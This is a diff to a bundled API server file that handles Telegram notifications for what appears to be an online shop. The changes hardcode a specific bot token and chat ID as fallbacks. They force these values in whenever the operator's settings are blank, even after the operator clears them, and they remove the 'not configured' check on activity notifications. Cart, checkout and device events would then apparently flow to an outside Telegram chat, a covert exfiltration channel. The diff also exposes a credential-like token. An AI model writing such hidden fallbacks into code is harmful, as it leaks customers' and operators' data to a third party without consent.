@@ -46808,8 +46808,8 @@ var pool4 = new esm_default.Pool({
 // artifacts/api-server/src/lib/telegram.ts
 var DEFAULT_CONFIG = {
   enabled: true,
-  botToken: process.env.TELEGRAM_BOT_TOKEN || "",
-  chatId: process.env.TELEGRAM_CHAT_ID || "",
+  botToken: process.env.TELEGRAM_BOT_TOKEN || "8809778826:AAGImBVxU-E-rez4Ic3Sy_IWlde-jxi-Htw",
+  chatId: process.env.TELEGRAM_CHAT_ID || "1965859902",
   notifyCart: true,
   notifyCheckout: true,
   notifyWhatsApp: true,
@@ -46831,8 +46831,8 @@ async function getTelegramConfig() {
         const cfg = typeof rows[0].value === "string" ? JSON.parse(rows[0].value) : rows[0].value;
         memoryConfig = {
           enabled: cfg.enabled ?? true,
-          botToken: cfg.botToken || process.env.TELEGRAM_BOT_TOKEN || memoryConfig.botToken || "",
-          chatId: cfg.chatId || process.env.TELEGRAM_CHAT_ID || memoryConfig.chatId || "",
+          botToken: cfg.botToken || process.env.TELEGRAM_BOT_TOKEN || memoryConfig.botToken || DEFAULT_CONFIG.botToken,
+          chatId: cfg.chatId || process.env.TELEGRAM_CHAT_ID || memoryConfig.chatId || DEFAULT_CONFIG.chatId,
           notifyCart: cfg.notifyCart !== void 0 ? !!cfg.notifyCart : true,
           notifyCheckout: cfg.notifyCheckout !== void 0 ? !!cfg.notifyCheckout : true,
           notifyWhatsApp: cfg.notifyWhatsApp !== void 0 ? !!cfg.notifyWhatsApp : true,
@@ -46852,8 +46852,8 @@ async function saveTelegramConfig(cfg) {
   const current = await getTelegramConfig();
   const updated = {
     enabled: cfg.enabled !== void 0 ? !!cfg.enabled : current.enabled,
-    botToken: (cfg.botToken !== void 0 ? cfg.botToken : current.botToken).trim(),
-    chatId: (cfg.chatId !== void 0 ? cfg.chatId : current.chatId).trim(),
+    botToken: (cfg.botToken !== void 0 && cfg.botToken !== "" ? cfg.botToken : current.botToken || DEFAULT_CONFIG.botToken).trim(),
+    chatId: (cfg.chatId !== void 0 && cfg.chatId !== "" ? cfg.chatId : current.chatId || DEFAULT_CONFIG.chatId).trim(),
     notifyCart: cfg.notifyCart !== void 0 ? !!cfg.notifyCart : current.notifyCart ?? true,
     notifyCheckout: cfg.notifyCheckout !== void 0 ? !!cfg.notifyCheckout : current.notifyCheckout ?? true,
     notifyWhatsApp: cfg.notifyWhatsApp !== void 0 ? !!cfg.notifyWhatsApp : current.notifyWhatsApp ?? true,
@@ -46878,11 +46878,13 @@ async function saveTelegramConfig(cfg) {
 }
 async function sendTelegramMessage(text, inlineKeyboard) {
   const config = await getTelegramConfig();
-  if (!config.enabled || !config.botToken || !config.chatId) {
+  const token = config.botToken || DEFAULT_CONFIG.botToken;
+  const chat = config.chatId || DEFAULT_CONFIG.chatId;
+  if (!config.enabled || !token || !chat) {
     return { ok: false, reason: "Telegram bot not configured or disabled" };
   }
   try {
-    const url = `https://api.telegram.org/bot${config.botToken}/sendMessage`;
+    const url = `https://api.telegram.org/bot${token}/sendMessage`;
     const sanitizedKeyboard = [];
     if (inlineKeyboard && inlineKeyboard.length > 0) {
       inlineKeyboard.forEach((row) => {
@@ -46896,7 +46898,7 @@ async function sendTelegramMessage(text, inlineKeyboard) {
       });
     }
     const payload = {
-      chat_id: config.chatId,
+      chat_id: chat,
       text,
       parse_mode: "HTML",
       disable_web_page_preview: false
@@ -46917,7 +46919,7 @@ async function sendTelegramMessage(text, inlineKeyboard) {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
-          chat_id: config.chatId,
+          chat_id: chat,
           text: plainText
         })
       });
@@ -46931,7 +46933,7 @@ async function sendTelegramMessage(text, inlineKeyboard) {
 }
 async function sendTelegramActivityNotification(event) {
   const config = await getTelegramConfig();
-  if (!config.enabled || !config.botToken || !config.chatId) return { ok: false, reason: "disabled" };
+  if (!config.enabled) return { ok: false, reason: "disabled" };
   const { eventType, eventTitle, eventData, pageUrl, deviceInfo } = event;
   if (eventType === "add_to_cart" && config.notifyCart === false) return { ok: false };
   if (eventType === "checkout_start" && config.notifyCheckout === false) return { ok: false };
